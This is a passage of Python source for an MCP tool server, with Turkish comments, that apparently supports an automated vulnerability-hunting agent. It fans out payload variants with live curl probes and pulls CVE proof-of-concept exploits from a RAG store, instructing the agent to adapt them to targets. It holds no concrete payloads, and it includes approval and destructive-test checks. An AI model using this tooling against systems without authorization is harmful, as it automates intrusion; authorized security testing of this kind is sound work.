        for v in variants:
            v["payload"] = payload
            if v["strategy"] in ("sibling_param", "origin_param"):
                v["url"] = _set_query_param(endpoint or target, v["param"], payload)
    hdr_dict = {}
    for h in (headers or "").split(";"):
        if ":" in h:
            k, _, val = h.partition(":")
            hdr_dict[k.strip()] = val.strip()

    validator_hook = _hook(vclass)
    results, executed = [], 0
    destructive = vclass in _DESTRUCTIVE

    for v in variants:
        item = {**v, "validator_followup": f"{validator_hook}(target_url='{v['url']}', param='{v.get('param','')}')",
                "curl": _curl_for(v, hdr_dict)}
        if live and not (destructive and not allow_mutations) and executed < max_requests:
            req_headers = dict(hdr_dict)
            if v["strategy"] == "header_location":
                req_headers[v["header"]] = v["payload"]
            baseline_url = v["url"]
            base_resp = _live_request("GET", endpoint or target or v["url"], headers=hdr_dict)
            probe = _live_request("GET", baseline_url, headers=req_headers)
            verdict, evidence = _light_oracle(vclass, v["payload"], base_resp, probe)
            item.update({"live": True, "status": probe.get("status"),
                         "triage_verdict": verdict, "evidence": evidence,
                         "confirm_now": verdict == "LIKELY"})
            executed += 1
            time.sleep(0.15)
        else:
            item["live"] = False
            if destructive and not allow_mutations:
                item["skipped_live"] = "yıkıcı sınıf — canlı koşum atlandı (allow_mutations=True gerekir)"
        results.append(item)

    likely = [r for r in results if r.get("triage_verdict") == "LIKELY"]
    return json.dumps({
        "engine": "auto-fanout (hunt_variants → kali-tools curl → validator)",
        "confirmed_finding": {"vuln_class": vclass, "param": param, "endpoint": endpoint},
        "mode": "LIVE" if live else "PLAN",
        "validator_hook": validator_hook,
        "variants": len(results), "executed_live": executed,
        "likely_hits": [{"url": r["url"], "location": r["location"], "evidence": r.get("evidence")}
                        for r in likely],
        "fanout": results[:max(12, max_requests)],
        "next": ("LIKELY varyantları validator_followup ile CONFIRMED yap → store_finding → "
                 "her yeni param/endpoint için auto_fanout_variants'ı tekrar çağırarak dallandır."),
        "note": "PLAN modu offline'dır (curl + validator çağrıları döndürür). LIVE modu hızlı "
                "triage'dır; KESİN kanıt için her zaman validator_hook çalıştır. Yıkıcı testlerde "
                "scope/onay (mcp__kali-tools__request_approval).",
    }, indent=2, ensure_ascii=False)


def _curl_for(v, hdr_dict):
    parts = ["curl -sk"]
    if v["strategy"] == "header_location":
        parts.append(f"-H '{v['header']}: {v['payload']}'")
    for k, val in hdr_dict.items():
        parts.append(f"-H '{k}: {val}'")
    parts.append(f"'{v['url']}'")
    return " ".join(parts)


# ═══════════════ H7. RAG ENRICHMENT (predict → rag-engine köprüsü, CVE PoC) ═══════════════
_CVE_RE = re.compile(r"CVE-\d{4}-\d{4,7}", re.I)


def _rag_db_dir():
    return os.path.join(CCO_HOME, "rag_db")


def _rag_search_inline(query, top_k=3):
    """Aynı ChromaDB'yi (rag-engine'in kullandığı) read-only sorgular. Yoksa None döner."""
    try:
        import chromadb
    except Exception:
        return None, "chromadb yok"
    db = _rag_db_dir()
    if not os.path.isdir(db):
        return None, "rag_db boş (henüz ingest yok)"
    try:
        client = chromadb.PersistentClient(path=db)
        hits = []
        for cname in ("exploits", "cves", "writeups"):
            try:
                coll = client.get_or_create_collection(cname, metadata={"hnsw:space": "cosine"})
                if coll.count() == 0:
                    continue
                res = coll.query(query_texts=[query], n_results=min(top_k, coll.count()))
                for i, did in enumerate(res["ids"][0]):
                    doc = res["documents"][0][i] if res["documents"] else ""
                    dist = res["distances"][0][i] if res["distances"] else 0
                    hits.append({"collection": cname, "id": did,
                                 "relevance": round(1 - dist, 3) if dist is not None else 0,
                                 "snippet": (doc or "")[:160]})
            except Exception:
                continue
        hits.sort(key=lambda h: h["relevance"], reverse=True)
        return hits[:top_k], None
    except Exception as e:
        return None, str(e)


@mcp.tool()
def enrich_with_rag(target: str = "", fingerprint: str = "", context: str = "",
                    predictions_json: str = "", top_k: int = 3) -> str:
    """H7 — RAG ENRICHMENT (rag-engine köprüsü). `predict_vulnerabilities` çıktısını OTOMATİK
    olarak RAG bilgi tabanına bağlar: her tahmin için (a) RAG'da inline semantic arama yapıp
    eşleşen PoC/exploit/CVE/writeup'ları çeker (ChromaDB doluysa), (b) tahminlerdeki CVE
    ID'leri için kesin `rag_ingest_cve` + searchsploit ingest + arama çağrılarından oluşan bir
    INGEST PLANI döndürür. Böylece "stack tahmini → somut PoC" zinciri otomatikleşir.

    Args:
        target: Hedef (predictions_json boşsa predict_vulnerabilities bunu kullanır)
        fingerprint: Stack/banner metni (predict için)
        context: Ek bağlam
        predictions_json: Hazır predict_vulnerabilities JSON çıktısı (boşsa içeride çalıştırılır)
        top_k: PoC başına döndürülecek RAG sonuç sayısı
    """
    if predictions_json.strip():
        try:
            pred = json.loads(predictions_json)
        except Exception as e:
            return json.dumps({"error": f"predictions_json parse: {e}"}, ensure_ascii=False)
    else:
        pred = json.loads(predict_vulnerabilities(target=target, fingerprint=fingerprint, context=context))

    predictions = pred.get("predictions", [])
    all_cves = set()
    enriched, ingest_plan, search_plan = [], [], []
    for p in predictions:
        cves = set()
        for fam in p.get("cve_families", []):
            cves.update(c.upper() for c in _CVE_RE.findall(fam))
        all_cves.update(cves)
        query = p.get("rag_query") or p["vuln_class"]
        hits, err = _rag_search_inline(query, top_k=top_k)
        enriched.append({
            "vuln_class": p["vuln_class"], "priority_score": p.get("priority_score"),
            "cve_ids": sorted(cves), "rag_query": query,
            "rag_hits": hits if hits else [],
            "rag_status": "ok" if hits else (err or "sonuç yok"),
        })
        for c in sorted(cves):
            ingest_plan.append(f"mcp__rag-engine__rag_ingest_cve(cve_id='{c}')")
        ingest_plan.append(f"mcp__rag-engine__rag_ingest_exploitdb(search_query='{query}')")
        search_plan.append(f"mcp__rag-engine__rag_search(query='{query}', top_k={top_k})")

    # dedup koruyarak sırayı koru
    ingest_plan = list(dict.fromkeys(ingest_plan))
    db_ready = os.path.isdir(_rag_db_dir())
    return json.dumps({
        "engine": "predict → RAG enrichment (CVE PoC retrieval)",
        "target": target or "(verilmedi)",
        "matched_technologies": pred.get("matched_technologies", []),
        "cve_ids_found": sorted(all_cves),
        "rag_db_ready": db_ready,
        "enriched_predictions": enriched,
        "ingest_plan": ingest_plan,
        "search_plan": list(dict.fromkeys(search_plan)),
        "workflow": "1) ingest_plan'i çalıştır (CVE'leri NVD'den + ExploitDB'den RAG'a yükle) → "
                    "2) search_plan ile somut PoC/exploit kodunu çek → 3) PoC'u hedefe uyarlayıp "
                    "validator ile doğrula.",
        "note": "rag_db_ready=false ise önce ingest_plan'i çalıştır; sonra enrich_with_rag tekrar "
                "çağrıldığında rag_hits inline dolar. CVE ID'leri tahminlerin cve_families'inden çıkarıldı.",
    }, indent=2, ensure_ascii=False)


if __name__ == "__main__":
    import sys
    transport = "stdio"
    for i, arg in enumerate(sys.argv):
        if arg == "--transport" and i < len(sys.argv) - 1:
            transport = sys.argv[i + 1]
    if transport == "stdio":
        mcp.run(transport="stdio")
    else:
        mcp.run()
